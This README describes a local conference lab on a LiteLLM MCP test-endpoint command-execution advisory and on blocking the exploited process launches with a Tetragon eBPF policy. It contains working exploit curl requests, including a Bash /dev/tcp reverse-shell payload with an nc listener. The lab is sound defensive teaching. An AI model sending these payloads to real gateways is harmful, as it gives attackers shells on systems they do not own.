# AI Gateway Runtime Security with eBPF

A local Ekoparty 2026 lab. An authenticated MCP test request starts a command with the LiteLLM proxy's privileges. The scenario calls back to a listener on the host. Tetragon can deny that process launch in the kernel.

## The bug

[GHSA-v4p8-mg3p-g94g](https://github.com/BerriAI/litellm/security/advisories/GHSA-v4p8-mg3p-g94g) affects LiteLLM `>=1.74.2, <1.83.7`. This lab pins `1.83.0-nightly`. The fix is `1.83.7`.

The MCP test endpoints accept `command`, `args`, and `env` in a server configuration. With `transport: stdio`, LiteLLM starts the supplied command as a subprocess. A valid proxy API key was enough; the affected endpoints did not check for the `PROXY_ADMIN` role. The endpoints are:

- `POST /mcp-rest/test/connection`
- `POST /mcp-rest/test/tools/list`

The tutorial sends raw curl requests to the first endpoint. One prints a single JSON line. The other opens a callback shell.

Without enforcement, that request gives you an interactive shell as the LiteLLM process. That's the impact. The MCP request still fails after you exit because a shell is not an MCP server. The error does not undo the command execution.

## What Tetragon sees

[`tracing-policy.yml`](tracing-policy.yml) selects the LiteLLM Pods (`app=gw`) and follows processes started by `/usr/bin/litellm`. It watches `bprm_check_security` for executable paths under `/usr/`, `/bin/`, and `/root/.cache/prisma-python/`.

The file starts in audit mode: `Post` reports matching launches without blocking them. Its commented `Override` action returns `-EPERM`; pipe a `sed` edit into `kubectl` later to enforce the policy. The file stays in audit mode, ready for the next run. See the [Tetragon 1.7.1 selector docs](https://github.com/cilium/tetragon/blob/v1.7.1/docs/content/en/docs/concepts/tracing-policy/selectors.md#override-action-for-kprobe-and-lsmhooks).

The path prefixes are broad. They also catch legitimate programs and shells. This is a demo policy, not a sandbox: it misses executables outside those paths and code that does not start another executable. The file also contains a commented alternate selector that drops the path filter and denies every executable in LiteLLM's descendant tree. Uncomment it if you want the whole tree blocked.

The policy does not inspect HTTP or understand MCP. It sees executable launches. `matchParentBinaries` needs Tetragon's `parents_map`, which `make up` enables. Apply a policy, then restart `gw`; that gives Tetragon a fresh LiteLLM process tree to follow. Existing processes are not retroactively tracked.

This is runtime mitigation for the demo, not a LiteLLM patch. Upgrade to `1.83.7` or later for the fix. If you cannot upgrade, the [advisory recommends blocking both test endpoints at a reverse proxy or API gateway](https://github.com/BerriAI/litellm/security/advisories/GHSA-v4p8-mg3p-g94g).

## Run it in order

Use a local Kubernetes cluster that supports Tetragon and can provision `ReadWriteOnce` PVCs. Check the context, then start the stack:

```bash
kubectl config current-context
make up
```

`make up` installs Tetragon and starts Open WebUI, LiteLLM, Ollama, the model, and the local port-forwards. It does not load a tracing policy yet.

- Open WebUI: <http://127.0.0.1:8080>
- LiteLLM: <http://127.0.0.1:4000>

### 1. Load the policy in audit mode

Apply the policy in audit mode, then restart LiteLLM so Tetragon can follow its new process tree:

```bash
kubectl apply -f tracing-policy.yml
kubectl -n ai rollout restart deployment/gw
kubectl -n ai rollout status deployment/gw --timeout=30m
```

Watch Tetragon in one terminal:

```bash
kubectl exec -it -n kube-system daemonset/tetragon -c tetragon -- tetra getevents -o compact --namespaces ai
```

### 2. Export the credentials and callback address

In the terminal where you'll send requests, export a current Open WebUI bearer token. Replace the placeholder; the Makefile will not create or refresh it:

```bash
export OPEN_WEBUI_JWT='YOUR_CURRENT_OPEN_WEBUI_JWT'
```

The callback address varies by host and local cluster driver. Pick a host IPv4 address the gateway Pod can reach. `127.0.0.1` points back to the Pod. On Linux, use the source address your host uses to reach the Kubernetes node as a candidate:

```bash
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
ip route get "$NODE_IP"
```

Use the address after `src`. In both the listener terminal and the request terminal, export that same address:

```bash
export CALLBACK_HOST=YOUR_HOST_IPV4
```

Other cluster drivers may expose the host through a different gateway address. Bind `nc` to the selected address, not every host interface.

### 3. Send a one-line JSON probe through LiteLLM

Run this raw request from the terminal with the JWT exported. Bash launches Python to print a namespace postcard: pod hostname, kernel, namespace IDs, capability mask, seccomp state, and cgroup. It all comes out as one JSON line, and Tetragon sees the shell and its child.

```bash
curl --fail-with-body --silent --show-error \
  http://127.0.0.1:8080/openai/mcp-rest/test/connection \
  -H "Authorization: Bearer $OPEN_WEBUI_JWT" \
  -H 'Content-Type: application/json' \
  --data-binary @- <<'JSON' || true
{
  "server_name": "process_probe",
  "transport": "stdio",
  "command": "bash",
  "args": [
    "-c",
    "/usr/bin/python3 -c 'import json,os; wanted=(\"Pid\",\"PPid\",\"NSpid\",\"Uid\",\"Gid\",\"CapEff\",\"NoNewPrivs\",\"Seccomp\"); status={k:v.strip() for k,v in (line.split(\":\",1) for line in open(\"/proc/self/status\")) if k in wanted}; ns={k:os.readlink(\"/proc/self/ns/\"+k) for k in (\"pid\",\"mnt\",\"net\",\"user\")}; print(json.dumps({\"pod\":os.uname().nodename,\"kernel\":os.uname().release,\"arch\":os.uname().machine,\"cwd\":os.getcwd(),\"namespaces\":ns,\"status\":status,\"cgroup\":open(\"/proc/self/cgroup\").read().strip().replace(chr(10),\";\")},separators=(\",\",\":\")))'"
  ],
  "env": {}
}
JSON
```

The endpoint can still return an MCP error: this command isn't an MCP server. That's fine for this probe; the point is to run a child process and see its container context in one line. Check the Tetragon stream for the audit events.

Check LiteLLM's logs between requests:

```bash
kubectl logs -n ai deployment/gw --all-containers=true --tail=100
```

The gateway is where the subprocess runs. Read the `gw` logs between requests.

### 4. Open a shell while the policy is still in audit mode

In a listener terminal, export the same callback address and start `nc`:

```bash
export CALLBACK_HOST=YOUR_HOST_IPV4
nc -lvk "$CALLBACK_HOST" 4444
```

In the request terminal, send the callback command with raw `curl`:

```bash
curl --fail-with-body --silent --show-error \
  http://127.0.0.1:8080/openai/mcp-rest/test/connection \
  -H "Authorization: Bearer $OPEN_WEBUI_JWT" \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON || true
{
  "server_name": "test_server",
  "transport": "stdio",
  "command": "bash",
  "args": [
    "-c",
    "bash -i >& /dev/tcp/${CALLBACK_HOST}/4444 0>&1"
  ],
  "env": {}
}
JSON
```

The shell should connect even though Tetragon reports the executable launches. Type `id`, then `exit`. Stop `nc` with Ctrl-C. Check the LiteLLM logs again.

### 5. Enforce the policy and try again

Apply the same policy with its enforcing action enabled. The `sed` pipeline only changes the manifest sent to Kubernetes; the file stays in audit mode:

```bash
sed 's/^            # ENFORCE: /            /' tracing-policy.yml | kubectl apply -f -
kubectl -n ai rollout restart deployment/gw
kubectl -n ai rollout status deployment/gw --timeout=30m
```

Start `nc` again in the listener terminal, then retry:

```bash
nc -lvk "$CALLBACK_HOST" 4444
```

Run the same raw `curl` from step 4 again.

This time Tetragon should report the denied launch and LiteLLM should get `Operation not permitted`. No shell should reach `nc`. Stop the listener with Ctrl-C, check the `gw` logs once more, then clear the token:

```bash
unset OPEN_WEBUI_JWT
```

The callback uses Bash's `/dev/tcp/host/port` redirection to open a TCP connection ([Bash manual](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)). Keep the listener bound to the selected host address and use it only in this lab.

## What runs here

| Component | Job |
|---|---|
| Open WebUI `v0.11.4` | Browser UI and OpenAI-compatible pass-through |
| LiteLLM `1.83.0-nightly` | Gateway; Deployment `gw`; model alias `qwen` |
| Ollama `0.34.4` | Local inference; Deployment `llm` |
| `qwen2.5:0.5b-instruct` | CPU model stored in the `llm-data` PVC |
| Tetragon `1.7.1` | Process events and enforcement |

The pinned LiteLLM image inventory is in [`sbom/`](sbom/). It includes a CycloneDX SBOM, executable paths, and symlinks for the `linux/amd64` image digest pinned in [`llm-chat-stack.yaml`](llm-chat-stack.yaml). Review the policy if you change that image.

The Makefile handles lab setup. The raw request payloads live in this tutorial. Kubernetes resources live in [`llm-chat-stack.yaml`](llm-chat-stack.yaml) and [`tracing-policy.yml`](tracing-policy.yml).
